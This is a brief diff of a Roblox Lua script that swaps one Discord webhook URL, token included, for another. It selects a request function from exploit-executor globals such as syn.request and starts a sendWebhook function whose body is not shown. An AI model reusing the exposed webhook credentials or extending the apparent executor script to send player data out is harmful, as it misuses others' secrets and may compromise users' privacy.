@@ -1,7 +1,7 @@
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 
-local webhookUrl = "https://discord.com/api/webhooks/1403889925048369212/dFJNJLxkIdzaXP2_VTPoMXvIcTSnl51fI8ipDHvfPnLp1G-l5IaTAN59tG1ae1tABR7D"
+local webhookUrl = "https://discord.com/api/webhooks/1404177205206192148/NQfFH27GUj-bpqFXRazmI2ju2ca9tFP556k7MxHBfkiWej-poFBU9P6XQWum1wkZgywc"
 local requestFunction = (syn and syn.request) or (http and http.request) or (http_request) or (request)
 
 local function sendWebhook()
